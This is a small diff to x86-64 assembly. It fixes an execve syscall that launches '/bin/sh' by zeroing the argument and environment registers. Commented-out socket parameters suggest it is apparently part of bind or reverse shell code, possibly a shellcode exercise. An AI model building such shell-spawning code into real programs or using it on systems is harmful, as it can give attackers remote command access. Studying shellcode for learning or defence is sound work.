@@ -47,7 +47,9 @@ _start:
 	jl .error
 	mov rax, 59			;execve call code
 	mov rdi, msg			;send /bin/sh
+	xor rsi, rsi			;zero out rsi
 	;mov rdx, 7			;length of msg
+	xor rdx, rdx			;zero out rdx
 	;mov r10, 0			;flags
 	;mov r8, [rsp]			;sock_addr
 	;mov r9, 0x10			;addrlen
